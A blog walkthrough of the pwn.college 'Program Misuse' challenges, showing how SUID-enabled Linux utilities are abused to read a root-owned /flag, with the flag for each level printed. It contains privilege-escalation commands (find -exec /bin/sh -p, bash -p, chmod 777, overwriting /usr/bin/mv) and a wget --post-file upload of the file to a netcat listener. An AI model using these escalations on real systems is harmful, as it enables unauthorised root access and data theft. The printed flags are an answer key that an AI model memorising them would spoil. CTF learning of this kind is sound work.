---
layout: post
title: pwn college Fundamental - Program Misuse
subtitle: How to Read Sensitive Files with SUID bit on the Commands and How to Escalate Privilege
# cover-img: /assets/img/banditlogo.png
thumbnail-img: /assets/img/pwnCollege.jpeg
# share-img: /assets/img/path.jpg
tags: [CLI, security, linux, pwn, college]
comments: true
author: Lantana Park
---

Introduction of pwn.college

pwn.college is an online platform to learn about core concept of cyber security.

How to get started

I connected pwn workspace throgh SSH.

1. Get the SSH key
   `ssh-keygen -f key -N''`

2. Input the SSH key in the setting

3. Connect its ssh server
   `ssh -i key hacker@dojo.pwn.college`

Program Misuse: Privilege Escalation

- There are two directory we need to go through
  one is /challenge(to check a quest) and the other is /flag(to get a flag)

- In this game, I need to escalte privilege to the root level by running an suid bit binary. And then capture the flag.

Level 1 - the SUID bit on /usr/bin/cat.

Answer: pwn.college{gjH7qtwyI85Casi0wlbiFF21WWV.01M0EDL0MjM3QzW}

`cat` command allows users to view(read), concatenate, create, copy, merge, and manipulate file contents.

```bash
`cat /flag`
```

Level 2 - the SUID bit on /usr/bin/more

Answer: pwn.college{QHV-ipnvyIz8Nc8hGg_3SYOSlTF.0FN0EDL0MjM3QzW}

`more` command allows users to view the text files in the command prompt and do scroll up and down through the page.

```bash
`more /flag`
```

Level 3 - the SUID bit on /usr/bin/less

Answer: pwn.college{QHV-ipnvyIz8Nc8hGg_3SYOSlTF.0FN0EDL0MjM3QzW}

`less` command allows users to read the contents of a text file one page (one screen) at a time. It is faster access because if a file is large.

```bash
`less /flag`
```

Level 4 - the SUID bit on /usr/bin/tail

Answer: pwn.college{w18iyy6r_Q4PqyYwepwYYLMVjcA.0lN0EDL0MjM3QzW}

`tail` command allows users to view the last few lines of a file. It can be also used to monitor the file changes in real time.

```bash
`tail /flag`
```

Level 5 - the SUID bit on /usr/bin/head

Answer: pwn.college{kPSTIF4gcgWqfG-LxDqDEc_Y1mK.01N0EDL0MjM3QzW}

`head` command allows users to modify and output and display the wanted amount of data. By default, it shows the first 10 lines.

```bash
`head /flag`
```

Level 6 - the SUID bit on /usr/bin/sort

Answer: pwn.college{sR_JFVkHOraSTyrEERthPJHkFmq.0FO0EDL0MjM3QzW}

`sort` command sorts the contents of a text file, line by line.

```bash
`sort /flag`
```

Level 7 - the SUID bit on /usr/bin/vim

Answer: pwn.college{kmOZJ-C1zDmicWdPZmQxfdA48mN.0VO0EDL0MjM3QzW}

`vim` is a editor to create or edit a text file. There are two modes in vim. One is the command mode and another is the insert mode. In the command mode, users can insert text.

```bash
`vim /flag`
```

Level 8 - the SUID bit on /usr/bin/emacs

Answer: pwn.college{s82YaBXGj7hiejfuk4gTOSiWRcS.0FM1EDL0MjM3QzW}

`emacs` is another file editor, like vim. The main difference between text editors like vi, vim, nano, and the Emacs is that is faster, powerful, and simple in terms of usage because of its simple user interface.

```bash
`emacs /flag`
```

Level 9 - the SUID bit on /usr/bin/nano

Answer: pwn.college{sJryTe-t1d5EN-wehnqIEnBp2a6.0VM1EDL0MjM3QzW}

`nano` is user-friendly command line-based text editor. Unlike vim editor or any other command-line editor, it doesn’t have any mode. And it has an easy GUI(Graphical User Interface) which allows users to interact directly with the text in spite of switching between the modes as in vim editor.

```bash
`nano /flag`
```

Level 10 - the SUID bit on /usr/bin/rev

Answer: pwn.college{AUiUyAs5rn99guDsmcLextnwB0i.0lM1EDL0MjM3QzW}

`rev` is to reverse the lines characterwise. It reverses the order of the characters in each lines by copying the specified files to the standard output.

```bash
`rev /flag`
`echo "}WzQ3MjM0LDE1Ml0.i0BwntxeLcmsDug99nr5sAyUiUA{egelloc.nwp" | rev`
```

Level 25 - the SUID bit on /usr/bin/find

Answer: pwn.college{0SWf5DIvyjnM2_ysyw26tcEJuyd.01N2EDL0MjM3QzW}

`find` is to search files and directories. To use the `find` command, I need to specify the directory to search and the criteria for the search.

```bash
find . -exec /bin/sh -p \;
# It will show a new shell
cat /flag
```

Level 26 - the SUID bit on /usr/bin/make

Answer: pwn.college{s0oqIbabpdJC-23-Uu5Y21RGCCW.0FO2EDL0MjM3QzW}

`make` is a utility for building and maintaining groups of programs and files form source code. It allows users to install and compile many utilities from the terminal.

In this command `echo 'password:;cat /flag'`, at first I made a shell command to execute the 'cat /flag' command via 'make' and then, in the `make -f - password`, I made targeted password in the arbitary shell is executed.

Please keep in mind, this process does not involve creating an 'password' file. The purpose of this command is to execute the `cat /flag` command via `make`.

```bash
echo 'password:;cat /flag' | make -f - password
```

Level 27 - the SUID bit on /usr/bin/nice

Answer: pwn.college{wRMEE6k8uu6sobd3Hfkf-l4BzhB.0VO2EDL0MjM3QzW}

`nice` launches a process with a user-defined scheduling priority and helps in execution of a program/process with modified scheduling priority.

If I want to specify a different niceness value, I can use the -n option followed by the desired priority adjustment. For example, to run cat /flag with a niceness value of 15, I can use: `nice -n 15 cat /flag`

```bash
nice cat /flag
```

Level 28 - the SUID bit on /usr/bin/timeout

Answer: pwn.college{cDc6BkglFWPDbdwI7TMjNuTlWDn.0FM3EDL0MjM3QzW}

`timeout` runs a command with a time limit.

```bash
timeout 5 cat /flag
```

Level 29 - the SUID bit on /usr/bin/stdbuf

Answer: pwn.college{cR0TeJSB2raThFbiBIs87t63BuY.0VM3EDL0MjM3QzW}

`stdbuf` allows users to modify the buffering operation for the input/output streams. `stdbuf` is particularly useful when I need to monitor logs in real-time or minimize delays in data transmission between multiple programs. For example, buffering can introduce delays when the output of one program needs to be immediately processed by another program. By adjusting buffering with stdbuf, you can achieve faster data processing.

```bash
stdbuf -o0 cat /flag
```

Level 30 - the SUID bit on /usr/bin/setarch

Answer: pwn.college{AkH0h0pB9gMYhJU9YeUXv-WZ472.0lM3EDL0MjM3QzW}

`setarch` allows users to run a program with a modified architecture environment, which can be useful for testing software under different kernel and CPU settings.

```bash
setarch x86_64 cat /flag
```

Level 31 - the SUID bit on /usr/bin/watch

Answer: pwn.college{QH3lv5d6078FQQz0bjfYQhpRtke.01M3EDL0MjM3QzW}

`watch` is useful when I have to execute a command repeatedly and watch the command output change over time. For example, I can use the watch command to monitor the system uptime or disk usage.

In this command, I used -x option because I wanted to pass command to the exec.

```bash
watch -x cat /flag
```

Level 32 - the SUID bit on /usr/bin/socat

Answer: pwn.college{g6zmXWWESnZFPUaPUIsLlf1w-eP.0FN3EDL0MjM3QzW}

`socat` is allows users to transfer data bidirectionally between network connections.

In this command, I used `-u` option becuase I wanted data to flow from the first specified address and then used `STDIN` because I wanted to read the input.

```bash
socat -u FILE:/flag,create STDIN
```

Level 33 - the SUID bit on /usr/bin/whiptail

Answer: pwn.college{4RBo4J5kMMoyHpzN7AqRMFH47sG.0VN3EDL0MjM3QzW}

`whiptail` displays dialog boxes from the shell script.

I used `--textbox` option to display the contents of a text file in a dialog box. Additionally I set the size. `--textbox <file> <height> <width>`

```bash
whiptail --textbox /flag 20 20
```

Level 34 - the SUID bit on /usr/bin/awk

Answer: pwn.college{0wQ8fhAfmQdX3A_Vt6tkhDsewpD.0lN3EDL0MjM3QzW}

`awk` is widely used command for text processing. In this command, I wanted to print all the contents of the file using `awk`

```bash
awk '{print $0}' /flag
```

Level 35 - the SUID bit on /usr/bin/sed

Answer: pwn.college{A50F5WAgo7e99SHynqGRpGPQp0\_.01N3EDL0MjM3QzW}

`sed` is a non-interactive text editor and aloows users insert, delete, search and replace. And it proceeds line by line, so each line is read individually, processed,and then output again.

With `-n`, `sed` will not print anything unless explicitly instructed to do so by a command. And I specified which line I want to print appending `p`(to print every lines explicitly)

```bash
sed -n 'p' /flag
```

Level 36 - the SUID bit on /usr/bin/ed

Answer: pwn.college{cEe-\_\_iRw_vEgfXYNTMtACiFNF4.0FO3EDL0MjM3QzW}

`ed` is a interactive line-oriented text editor. It is used to create, display, modify and otherwise manipulate text files. Users can interact with `ed` through commands.

```bash
ed /flag
vim
```

Level 37 - the SUID bit on /usr/bin/chown

Answer: pwn.college{gqg9sqiZFX7alxGIZ98v3-Qs9Dw.0VO3EDL0MjM3QzW}

`chown` allows users to change the user and/or group ownership of a give file, directory, or sybolic link. Since I have user ID 1000, I changed the ownership 1000. I can revise the 1000 into hacker.

```bash
hacker@program-misuselevel37:$ id
uid=1000(hacker) gid=1000(hacker) groups=1000(hacker)
```

```bash
chown 1000 /flag
cat /flag
```

Level 38 - the SUID bit on /usr/bin/chmod

Answer: pwn.college{spxq7iZ7P8nd3idDyxiIZL0nOO0.0FM4EDL0MjM3QzW}

`chmod` allows users to set or modify a file's permissions.

In this command, `777` represents the permission settings I am applying to the file or directory. In LINUX, file permissions are based on a three-digit code where each digit can range from 0 to 7. Each digit represents the permissions for the user (owner), group, and others (everyone else), in that order. The value `7` in linux permissions represents full permissions: read (4), write (2), and execute (1). Adding these up gives you 7, meaning full permissions.
Therefore, 777 means I am setting the permissions so that the user, the group, and others can all read, write, and execute the file or directory.

```bash
chmod 777 /flag
cat /flag
```

Level 39 - the SUID bit on /usr/bin/cp

Answer: pwn.college{ghmegt2gKsBtigrS10kfFdOUyhR.0VM4EDL0MjM3QzW}

`cp` is used to copy files and directories. The copied files usually inherites the permission of the original file. However, in this command, I could control this behavior using the `--no-preserve` option with `cp`.

```bash
cp --no-preserve=mode /flag /myflag
cat /myflag
```

Level 40 - set the SUID bit on /usr/bin/mv

Answer: pwn.college{srAEsZ8yGzV0Za_PdVRNy3WQSfV.0lM4EDL0MjM3QzW}

`mv` is used to move files. In this command, I had to open a path for priviilege escalation using `mv`. There is dark side of using the `mv` command. I can move the `cat` to be able to executable into `mv`. That means I tried to essentially overwrite the `mv` binary with the `cat` binary in the `/usr/bin` directory. So, after executing this command, when I run the `mv`, it will behaves as `cat` instead of its original move functionality.

```bash
mv /usr/bin/cat /usr/bin/mv
# overwrite the binary cat -> move
/challenge/babysuid_level40
# executing a binary located at the path
mv /flag
# with the elevated privilieges through suid, I attempted to read the /flag file.
```

Level 41 - set the SUID bit on /usr/bin/perl

Answer: pwn.college{wZPrtu-L0vx7jpeLkjIj3bc_gk5.01M4EDL0MjM3QzW}

Perl officially stands for "Practical Extraction and Report Language.". If I use `perl` command, it invokes the perl interpreter, which is used to execute perl scripts. `-n`make the program read input line by line, but it does not automatically print the lines. `e` allows me to specify a line of script directly on the command line. And it is what makes it possilbe to execute perl code without needing to write a script file. `"print"` is to be executed for each line of the input file.

In short, `perl` enters a loop where it reads /flag(filename) line by line. For each line, it executes the print command. Since `print` is called without specific arguments, it prints the contents.

```bash
perl -ne "print" /flag
```

Level 42 - set the SUID bit on /usr/bin/python.

Answer: pwn.college{kdID5er9qHEA6XihDvSPJlZOyIQ.0FN4EDL0MjM3QzW}

`python` invokes python program interpreter.

```bash
python /flag
```

Level 43 - the SUID bit on /usr/bin/ruby

Answer: pwn.college{k5fRyb6pVBtFJGO6S8Uq1bC07HR.0VN4EDL0MjM3QzW}

`ruby` invokes ruby program interpreter

```bash
ruby /flag
```

Level 44 - the SUID bit on /usr/bin/bash

Answer: pwn.college{M01NrvGNVhClH5p0HpZA8RgtHWt.0lN4EDL0MjM3QzW}

`bash` is an sh-compatible command language interpreter that executes commands read from the standard input or from a file. `/usr/bin/bash -p` means I want to new a new bash retaining the privilieges of the effective user ID. And then within the new bash, I can read the file using `cat`

```bash
/usr/bin/bash -p
# make a new bash with the retained privilege.
cat /flag
# read the file within the newly invoked bash.
```

Level 45 - the SUID bit on /usr/bin/date

Answer: pwn.college{YTqMkMxYHMAMdI3CxO4EEJ8oiyo.01N4EDL0MjM3QzW}

`date` command is to display the system date and time, and set the date and time of the system. With `--file=filename` option, I can display the date string present at each line of file in the date and time formate.

```bash
date --file=/flag
```

Level 46 - the SUID bit on /usr/bin/dmesg

Answer: pwn.college{Uqh_AOfFq2BgYf_4cVJorF4zkGD.0FO4EDL0MjM3QzW}

`dmesg` is to print and control all messages from the kernel right buffer, which is a data structure used to store log message. With the option `-F` reads the messages from the given file.

```bash
dmesg -F /flag
```

Level 47 - the SUID bit on /usr/bin/wc

Answer: pwn.college{M46b9kvru240lgAq0FTNR37YcW9.0VO4EDL0MjM3QzW}

`wc` prints newline, word, and byte counts for each file. `--files0-from=filename` reads input from the file.

```bash
wc --files0-from=/flag
```

Level 48 - the SUID bit on /usr/bin/gcc

Answer: pwn.college{UnvGd7PJc2Li7MUWz4cE8NAhPbe.0FM5EDL0MjM3QzW}

`gcc` is a feature-rich set of compilers for various programming languages, most notably C and C++, allowing developers to compile source code into executable programs. With `-x` option, I can specify explicitly the language for the following input files. I set c to compile this file.

```bash
gcc -x c /flag
```

Level 49 - the SUID bit on /usr/bin/as

Answer: pwn.college{8U-rX7iW3yukkktKWa-xDQppk7R.0VM5EDL0MjM3QzW}

`as` reads assembly language(a low-level programming language that is closer to machine code) instructions from a source file and produces an object file in binary format.

```bash
as /flag
```

Level 50 - the SUID bit on /usr/bin/wget

Answer: pwn.college{gJZac_7kEHApg98oKE2-XE1wghC.0lM5EDL0MjM3QzW}

`wget` allows users to download files from the internet. It supports HTTP, HTTPS, and FTP protocoles, as well as retrieval through HTTP proxies.

In order to solve this question, I opened a netcat listener on port 8888, `nc -l -p 8888&`. `-l` tells Netcat to listen incoming connections, `-p 8888` specifies the port number on which Netcat listens, and `&` places this command in the background.

Additionally, `--post-file=/flag` tells `wget` to read the content of the `/flag` file and use them as the data for an HTTP POST request. And I specified the local address and port number where Netcat is listening.

Finally, after executing the `wget` command, `wget` atteps to send the contents of `/flag` to the specified address(`http://127.0.0.1:8888`). And, Netcat, listening on port 8888, receives the connection and prints the contents of the `/flag` file to the terminal where it is running. This allowed me to read the file.

```bash
nc -l -p 8888 &
wget --post-file=/flag http://127.0.0.1:8888
```

Level 51 - the SUID bit on /usr/bin/ssh-keygen

Answer:

---end---
